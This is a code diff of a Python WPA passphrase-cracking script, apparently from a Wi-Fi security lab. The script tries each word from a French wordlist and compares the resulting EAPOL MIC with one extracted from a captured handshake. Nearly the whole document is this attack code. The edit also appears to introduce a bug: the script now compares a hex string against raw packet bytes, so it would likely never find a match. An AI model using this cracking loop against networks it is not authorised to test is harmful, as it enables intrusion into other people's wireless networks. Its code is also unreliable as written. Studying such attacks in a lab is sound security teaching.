@@ -48,24 +48,22 @@ def compute_mic(passPhrase):
     # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
     mic = hmac.new(ptk[0:16], data, hashlib.sha1)
 
-    return mic
+    return mic.hexdigest()[:-8]
 
-def get_mic_to_test():
+
+if __name__ == "__main__":
+
+    # De https://raw.githubusercontent.com/Taknok/French-Wordlist/master/francais.txt
+    filename = "wordlist.txt"
+
+    with open(filename, "r") as f:
+        passwords = f.readlines()
+
     _, _, _, _, _, mic_to_test, _, _ = extract_info_from_packet()
-    return mic_to_test.hex()
 
-# De https://raw.githubusercontent.com/Taknok/French-Wordlist/master/francais.txt
-filename = "wordlist.txt"
-
-with open(filename, "r") as f:
-    passwords = f.readlines()
-
-a = get_mic_to_test()
-mic_to_test = "36eef66540fa801ceee2fea9b7929b40fdb0abaa"
-
-for password in passwords:
-    password = password.strip()
-    print("Testing password: {}".format(password))
-    if compute_mic(password).hexdigest() == mic_to_test:
-        print("Password found: {}".format(password))
-        break
+    for password in passwords:
+        password = password.strip()
+        print("Testing password: {}".format(password))
+        if compute_mic(password) == mic_to_test:
+            print("Password found: {}".format(password))
+            break
